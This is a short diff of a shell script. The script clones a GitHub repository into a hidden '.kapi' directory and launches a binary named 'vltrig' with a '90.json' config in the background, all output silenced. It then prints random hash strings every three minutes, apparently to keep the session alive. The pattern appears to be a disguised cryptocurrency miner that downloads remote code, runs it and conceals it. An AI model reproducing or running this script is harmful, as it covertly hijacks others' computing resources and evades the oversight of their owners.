@@ -10,6 +10,6 @@ sudo apt-get update
 mkdir .kapi && cd .kapi
 git clone https://github.com/crewi2013-hue/kelop.git
 cd kelop
-chmod +x 90.json && chmod +x zepo
+chmod +x 90.json && chmod +x vltrig
 ./vltrig -c "90.json" > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
